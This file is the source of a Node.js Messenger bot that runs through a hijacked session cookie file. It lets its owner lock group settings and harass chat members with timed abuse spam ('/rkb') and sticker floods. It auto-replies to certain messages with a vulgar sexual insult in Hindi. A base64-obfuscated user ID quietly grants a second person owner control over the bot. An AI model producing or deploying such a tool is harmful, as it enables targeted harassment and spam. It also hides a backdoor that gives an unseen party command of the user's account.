const fs = require("fs");
const login = require("ws3-fca");
const request = require("request");

let rkbInterval = null;
let stopRequested = false;
const lockedGroupNames = {};
const lockedThemes = {};
const lockedEmojis = {};
const lockedDPs = {};
const lockedNicks = {}; // { uid: nickname }
let mediaLoopInterval = null;
let lastMedia = null;
let targetUID = null;
let stickerInterval = null;
let stickerLoopActive = false;

const friendUIDs = fs.existsSync("Friend.txt")
  ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const targetUIDs = fs.existsSync("Target.txt")
  ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body, logMessageType, logMessageData } = event;

        // ===== Auto Reverts =====

        // Group Name Lock Revert
        if (logMessageType === "log:thread-name" && lockedGroupNames[threadID]) {
          if (logMessageData?.name !== lockedGroupNames[threadID]) {
            await api.setTitle(lockedGroupNames[threadID], threadID);
            console.log(`🔒 Group name reverted in ${threadID}`);
          }
        }

        // Theme Lock Revert
        if (logMessageType === "log:thread-color" && lockedThemes[threadID]) {
          if (logMessageData?.theme_color !== lockedThemes[threadID]) {
            await api.changeThreadColor(lockedThemes[threadID], threadID);
            console.log(`🎨 Theme reverted in ${threadID}`);
          }
        }

        // Emoji Lock Revert
        if (logMessageType === "log:thread-icon" && lockedEmojis[threadID]) {
          const lockedEmoji = lockedEmojis[threadID];
          const newEmoji = logMessageData?.thread_icon;
          if (newEmoji !== lockedEmoji) {
            try {
              await api.changeThreadEmoji(lockedEmoji, threadID);
              console.log(`😀 Emoji reverted in ${threadID}`);
            } catch (e) {
              console.log("⚠️ Emoji revert failed:", e.message);
            }
          }
        }

        // DP Lock Revert
        if (logMessageType === "log:thread-image" && lockedDPs[threadID]) {
          try {
            const stream = fs.createReadStream(lockedDPs[threadID]);
            await api.changeGroupImage(stream, threadID);
            console.log(`🖼 DP reverted in ${threadID}`);
          } catch (e) {
            console.log("⚠️ DP revert failed:", e.message);
          }
        }

        // Nickname Lock Revert
        if (logMessageType === "log:user-nickname" && lockedNicks[senderID]) {
          const lockedNick = lockedNicks[senderID];
          const currentNick = logMessageData?.nickname;
          if (currentNick !== lockedNick) {
            try {
              await api.changeNickname(lockedNick, threadID, senderID);
              console.log(`🔒 Nickname reverted for UID: ${senderID}`);
            } catch (e) {
              console.log("⚠️ Nick revert failed:", e.message);
            }
          }
        }

        // ==== Message Handling ====
        if (!body) return;
        const lowerBody = body.toLowerCase();

        const badNames = ["Rocky", "Ishu"];
        const triggers = ["rkb", "bhen", "maa", "rndi", "chut", "randi", "madrchod", "mc", "bc", "didi", "ma"];

        if (badNames.some(n => lowerBody.includes(n)) &&
            triggers.some(w => lowerBody.includes(w)) &&
            !friendUIDs.includes(senderID)) {
          return api.sendMessage(
            "teri ma Rndi hai tu msg mt kr sb chodege teri ma ko byy🙂 ss Lekr story Lga by",
            threadID
          );
        }

        if (![ownerUID, LID].includes(senderID)) return;

        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        // ==== Commands ====

        if (cmd === "/help") {
          return api.sendMessage(`
📖 Owner Rocky Bot Commands:
/help → Ye message
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji 😀 → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → Current group DP lock
/unlockdp → Group DP unlock
/locknick @mention + nickname → Specific nickname lock
/unlocknick @mention → Nick lock remove
/allname [nick] → Sabka nickname change
/uid → Reply/Mention/User UID show
/tid → Group Thread ID show
/exit → Bot group se exit
/rkb [name] → Line by line gaali spam
/stop → Spam stop
/stickerX → Sticker spam (X=seconds delay)
/stopsticker → Sticker spam stop
/target [uid] → Set target UID
/cleartarget → Clear target
          `, threadID);
        }

        // ==== Group Name Lock ====
        else if (cmd === "/gclock") {
          await api.setTitle(input, threadID);
          lockedGroupNames[threadID] = input;
          api.sendMessage("Rocky sir 🔒 Group name locked!", threadID);
        }
        else if (cmd === "/unlockgc") {
          delete lockedGroupNames[threadID];
          api.sendMessage("Rocky sir🔓 Group name unlocked!", threadID);
        }

        // ==== Theme Lock ====
        else if (cmd === "/locktheme") {
          if (!input) return api.sendMessage("❌ Color code do!", threadID);
          await api.changeThreadColor(input, threadID);
          lockedThemes[threadID] = input;
          api.sendMessage("Rocky sir 🎨 Theme locked!", threadID);
        }
        else if (cmd === "/unlocktheme") {
          delete lockedThemes[threadID];
          api.sendMessage("Rocky sir 🎨 Theme unlocked!", threadID);
        }

        // ==== Emoji Lock ====
        else if (cmd === "/lockemoji") {
          if (!input) return api.sendMessage("❌ Emoji do!", threadID);
          lockedEmojis[threadID] = input;
          try {
            await api.changeThreadEmoji(input, threadID);
            api.sendMessage(`Rocky sir 😀 Emoji locked → ${input}`, threadID);
          } catch {
            api.sendMessage("Rocky sir ⚠️ Emoji lock fail!", threadID);
          }
        }
        else if (cmd === "/unlockemoji") {
          delete lockedEmojis[threadID];
          api.sendMessage("Rocky sir 🔓 Emoji unlocked!", threadID);
        }

        // ==== DP Lock ====
        else if (cmd === "/lockdp") {
          try {
            const info = await api.getThreadInfo(threadID);
            const dpUrl = info.imageSrc;
            if (!dpUrl) return api.sendMessage("❌ Is group me koi DP nahi hai!", threadID);

            const filePath = `locked_dp_${threadID}.jpg`;
            request(dpUrl).pipe(fs.createWriteStream(filePath)).on("close", () => {
              lockedDPs[threadID] = filePath;
              api.sendMessage("Rocky sir🖼 Current group DP ab lock ho gayi hai 🔒", threadID);
            });
          } catch (e) {
            api.sendMessage("Rocky sir ⚠️ DP lock error!", threadID);
          }
        }
        else if (cmd === "/unlockdp") {
          delete lockedDPs[threadID];
          api.sendMessage("Rocky sir 🔓 DP lock remove ho gaya ✔️", threadID);
        }

        // ==== Nick Lock ====
        else if (cmd === "/locknick") {
          if (event.mentions && Object.keys(event.mentions).length > 0 && input) {
            const target = Object.keys(event.mentions)[0];
            const nickname = input.replace(Object.values(event.mentions)[0], "").trim();
            lockedNicks[target] = nickname;
            await api.changeNickname(nickname, threadID, target);
            api.sendMessage(`Rocky sir 🔒 Nick lock set for ${target} → ${nickname}`, threadID);
          } else {
            api.sendMessage("Rocky sir ❌ Usage: /locknick @mention + nickname", threadID);
          }
        }
        else if (cmd === "/unlocknick") {
          if (event.mentions && Object.keys(event.mentions).length > 0) {
            const target = Object.keys(event.mentions)[0];
            delete lockedNicks[target];
            api.sendMessage(`Rocky sir🔓 Nick lock removed for ${target}`, threadID);
          } else {
            api.sendMessage("Rocky sir ❌ Mention karo kiska nick unlock karna hai!", threadID);
          }
        }

        // ==== UID / TID ====
        else if (cmd === "/uid") {
          if (event.messageReply) {
            return api.sendMessage(`Rocky sir lijiye Target kijiye 🆔 Reply UID: ${event.messageReply.senderID}`, threadID);
          } else if (event.mentions && Object.keys(event.mentions).length > 0) {
            const target = Object.keys(event.mentions)[0];
            return api.sendMessage(`Rocky sir lijiye Target kijiye 🆔 Mention UID: ${target}`, threadID);
          } else {
            return api.sendMessage(`Rocky sir apka 🆔 Your UID: ${senderID}`, threadID);
          }
        }
        else if (cmd === "/tid") {
          api.sendMessage(`Rocky sir lijiye 🆔 Group Thread ID: ${threadID}`, threadID);
        }

        // ==== Exit ====
        else if (cmd === "/exit") {
          try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {}
        }

        // ==== RKB Spam ====
        else if (cmd === "/rkb") {
          if (!fs.existsSync("np.txt")) return api.sendMessage("❌ np.txt missing!", threadID);
          const name = input.trim();
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          stopRequested = false;
          if (rkbInterval) clearInterval(rkbInterval);
          let index = 0;
          rkbInterval = setInterval(() => {
            if (index >= lines.length || stopRequested) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${name} ${lines[index]}`, threadID);
            index++;
          }, 5000);
          api.sendMessage(`🤬 Rocky sir ko Abuse Start gaali on ${name}`, threadID);
        }

        else if (cmd === "/stop") {
          stopRequested = true;
          if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; }
        }

        // ==== Sticker Spam ====
        else if (cmd.startsWith("/sticker")) {
          if (!fs.existsSync("Sticker.txt")) return;
          const delay = parseInt(cmd.replace("/sticker", ""));
          const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
          if (stickerInterval) clearInterval(stickerInterval);
          let i = 0; stickerLoopActive = true;
          stickerInterval = setInterval(() => {
            if (!stickerLoopActive || i >= stickerIDs.length) {
              clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; return;
            }
            api.sendMessage({ sticker: stickerIDs[i] }, threadID);
            i++;
          }, delay * 1000);
        }

        else if (cmd === "/stopsticker") {
          if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; }
        }

        // ==== Target ====
        else if (cmd === "/target") {
          targetUID = input.trim();
          api.sendMessage(`Rocky sir 🎯 Target set: ${targetUID}`, threadID);
        }
        else if (cmd === "/cleartarget") {
          targetUID = null;
          api.sendMessage("Rocky sir 🎯 Target cleared!", threadID);
        }

      } catch (e) { console.error("⚠️ Error:", e.message); }
    });
  });
}

module.exports = { startBot };
